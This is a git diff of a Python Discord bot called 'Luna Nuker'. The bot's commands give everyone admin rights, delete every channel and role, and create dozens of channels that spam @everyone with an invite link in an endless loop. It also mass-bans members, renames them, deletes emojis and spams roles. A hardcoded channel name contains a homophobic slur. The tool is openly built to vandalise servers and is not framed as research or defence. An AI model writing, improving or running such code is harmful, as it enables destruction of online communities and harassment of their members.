@@ -14,8 +14,11 @@ red = Colors.red
 green = Colors.green
 white = Colors.white
 
-try:
-   with open(f"config.json", encoding='utf8') as f:
+
+# Here we check if the config file exists and if it does we load all the data
+if os.path.exists("config.json"):
+
+    with open(f"config.json", encoding='utf8') as f:
         config = json.load(f)
         token = config["token"]
         prefix = config["prefix"]
@@ -24,43 +27,63 @@ try:
         channel_names = config["channel_names"]
         messages_to_spam = config["messages_to_spam"]
         invite_link = config["invite_link"]
-except FileNotFoundError:
+
+# If the config file doesn't exist. We will get the needed data from the user via console input and then write it.
+elif not os.path.exists("config.json"):
+
     token = input(white + "Token " + Colors.reset + Colors.purple + ">> ")
     prefix = input(white + "Prefix " + Colors.reset + Colors.purple + ">> ")
     bot_status = input(white + "Bot Status " + Colors.reset + Colors.purple + ">> ")
     server_name = input(white + "Server Name " + Colors.reset + Colors.purple + ">> ")
     invite_link = input(white + "Invite Link That'll Be Sent " + Colors.reset + Colors.purple + ">> ")
-    channel_names = ["Get Clapped","Get Nuked L","Ez Nuke"]
-    messages_to_spam = ["If you can't beat them. Join them 😈", "Sorry Not Sorry","Major L"],
-    config = {
-        "token": token,
-        "prefix": prefix,
-        "bot_status": bot_status,
-        "server_name": server_name,
-        "channel_names": channel_names,
-        "messages_to_spam": messages_to_spam,
-        "invite_link": invite_link,
-    }
+
+    if token == "" or token == None:
+        token = ""
+
+    if prefix == "" or prefix == None:
+        prefix = "$"
+
+    if bot_status == "" or bot_status == None:
+        bot_status == "Protecting 14 servers right now!"
+
+    if server_name == "" or server_name == None:
+        server_name == "ez nuke"
+
+    if invite_link == "" or invite_link == None:
+        invite_link == "https://discord.gg/YAZErTJajf"
+
     with open("config.json", "w") as data:
-        json.dump(config, data, indent=2)
+        data.write(fr"""
+    {
+    "token": {token},
+    "prefix": {prefix},
+    "bot_status": {bot_status},
+    "server_name": {server_name},
+    "channel_names": ["Luna Nuked You","HOLD THIS L","Get Fucked Faggots" ],
+    "messages_to_spam": ["If you can't beat them. Join them 😈", "Sorry Not Sorry","Major L"],
+    "invite_link": {invite_link}
+    }
+    """)
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix=prefix, intents=intents)
 bot.remove_command('help')
 
+
 @bot.event
 async def on_ready():
     System.Title("Luna Nuker - Made By Smug")
-    System.Size(101,15)
+    System.Size(101, 15)
     Cursor.HideCursor()
     os.system('cls')
     print("\n\n\n")
     print(Center.XCenter(Colorate.Vertical(Colors.purple_to_blue, f'''
             ██      ██    ██ ███   ██  █████    ███   ██ ██    ██ ██   ██ ███████ ██████
             ██      ██    ██ ████  ██ ██   ██   ████  ██ ██    ██ ██  ██  ██      ██   ██
-            ██      ██    ██ ██ ██ ██ ███████   ██ ██ ██ ██    ██ █████   █████   ██████ 
+            ██      ██    ██ ██ ██ ██ ███████   ██ ██ ██ ██    ██ █████   █████   ██████
             ██      ██    ██ ██  ████ ██   ██   ██  ████ ██    ██ ██  ██  ██      ██   ██
             ███████  ██████  ██   ███ ██   ██   ██   ███  ██████  ██   ██ ███████ ██   ██''')))
+
 
 @bot.event
 async def on_command_error(error):
@@ -76,23 +99,28 @@ async def on_command_error(error):
         print(f'{white}Press Enter To Exit . . .')
         input()
         os.system("main.py")
-            
-@bot.command(aliases=['Help'])
-async def help(ctx):    
-  await ctx.message.delete()
-  member = ctx.message.author
-  global embed
-  embed = Embed(title="Booster Nuker", color=5639644)
-  embed.set_author(name='Help ')
-  embed.add_field(name='Rename', value='Renames every member in a server to ', inline=False)
-  embed.add_field(name='Nuke', value='Nukes the server ', inline=False)
-  embed.add_field(name='Stop', value='Stops the bot nuking and restarts the console ', inline=False)
-  embed.add_field(name='Massban', value='Bans all members ', inline=False)
-  embed.add_field(name='Spamrole', value='Creates lots of roles ', inline=False)
-  embed.add_field(name='Emoji', value='Deletes all emojis ', inline=False)
-  await member.send(embed=embed)
 
-@bot.command(aliases=['Nuke','NUKE', 'nk', 'Nk', 'NK'])
+
+@bot.command(aliases=['Help'])
+async def help(ctx):
+    await ctx.message.delete()
+    member = ctx.message.author
+    global embed
+    embed = Embed(title="Booster Nuker", color=5639644)
+    embed.set_author(name='Help ')
+    embed.add_field(
+        name='Rename', value='Renames every member in a server to ', inline=False)
+    embed.add_field(name='Nuke', value='Nukes the server ', inline=False)
+    embed.add_field(
+        name='Stop', value='Stops the bot nuking and restarts the console ', inline=False)
+    embed.add_field(name='Massban', value='Bans all members ', inline=False)
+    embed.add_field(name='Spamrole',
+                    value='Creates lots of roles ', inline=False)
+    embed.add_field(name='Emoji', value='Deletes all emojis ', inline=False)
+    await member.send(embed=embed)
+
+
+@bot.command(aliases=['Nuke', 'NUKE', 'nk', 'Nk', 'NK'])
 async def nuke(ctx):
     guild = ctx.guild
     await ctx.message.delete()
@@ -111,40 +139,42 @@ async def nuke(ctx):
         print(f"{red}Bot status could not be changed")
 
     try:
-      role = discord.utils.get(guild.roles, name = "@everyone")
-      await role.edit(permissions = Permissions.all())
-      print(f"{green}I have given everyone admin")
+        role = discord.utils.get(guild.roles, name="@everyone")
+        await role.edit(permissions=Permissions.all())
+        print(f"{green}I have given everyone admin")
     except:
-      print(f"{red}I was unable to give everyone admin")
+        print(f"{red}I was unable to give everyone admin")
 
     for channel in guild.channels:
-      try:
-        await channel.delete()
-        print(f"{green}{channel.name} was deleted.")
-      except:
-        print(f"{red}{channel.name} was NOT deleted.")
+        try:
+            await channel.delete()
+            print(f"{green}{channel.name} was deleted.")
+        except:
+            print(f"{red}{channel.name} was NOT deleted.")
 
     for role in guild.roles:
-     try:
-       await role.delete()
-       print(f"{red}{role.name} Has been deleted")
-     except:
-       print(f"{red}{role.name} Has not been deleted")
+        try:
+            await role.delete()
+            print(f"{red}{role.name} Has been deleted")
+        except:
+            print(f"{red}{role.name} Has not been deleted")
     await guild.create_text_channel("Luna Nuked You")
 
     for channel in guild.text_channels:
-        link = await channel.create_invite(max_age = 0, max_uses = 0)
+        link = await channel.create_invite(max_age=0, max_uses=0)
         print(f"{green}New Invite: {link}")
 
     for i in range(45):
-       await guild.create_text_channel(random.choice(channel_names))
+        await guild.create_text_channel(random.choice(channel_names))
     return
+
 
 @bot.event
 async def on_guild_channel_create(channel):
     message = f"@everyone {random.choice(messages_to_spam)} {invite_link}"
     while True:
         await channel.send(message)
+
 
 @bot.command(aliases=['Rename'])
 async def rename(ctx):
@@ -153,16 +183,18 @@ async def rename(ctx):
     try:
         for member in list(ctx.guild.members):
             payload = {
-                    "nick": "EzNuke"
-                    }
-            headers = {
-            "Authorization": f"Bot {token}",
-            "Content-Type": "application/json",
+                "nick": "EzNuke"
             }
-            r = requests.patch(f'https://discord.com/api/v9/guilds/{ctx.guild.id}/members/{member.id}', data=json.dumps(payload), headers=headers)
+            headers = {
+                "Authorization": f"Bot {token}",
+                "Content-Type": "application/json",
+            }
+            r = requests.patch(
+                f'https://discord.com/api/v9/guilds/{ctx.guild.id}/members/{member.id}', data=json.dumps(payload), headers=headers)
             print(f"{green}{member.name} was renamed.")
     except:
         print(f"{red}{member.name} was not renamed.")
+
 
 @bot.command(aliases=['Emoji'])
 async def emoji(ctx):
@@ -175,13 +207,15 @@ async def emoji(ctx):
     except:
         print(f"{red}{emoji} was not deleted.")
 
+
 @bot.command(aliases=['Stop'])
 async def stop(ctx):
-  System.Title(f'Luna Nuker - Restarting client . . .')
-  await ctx.message.delete()
-  print(f"Restarting '{bot.user.name}'. . .")
-  os.system("main.py")
-  return
+    System.Title(f'Luna Nuker - Restarting client . . .')
+    await ctx.message.delete()
+    print(f"Restarting '{bot.user.name}'. . .")
+    os.system("main.py")
+    return
+
 
 @bot.command(aliases=['Massban'])
 async def massban(ctx):
@@ -194,8 +228,9 @@ async def massban(ctx):
     except:
         print(f"{red}Couldn't Ban {member}!")
 
+
 @bot.command(alliases=['Spamrole'])
-async def spamrole(ctx, name = "EzNuke"):
+async def spamrole(ctx, name="EzNuke"):
     System.Title(f'Luna Nuker - Spamming Roles . . .')
     guild = ctx.guild
     await ctx.message.delete()
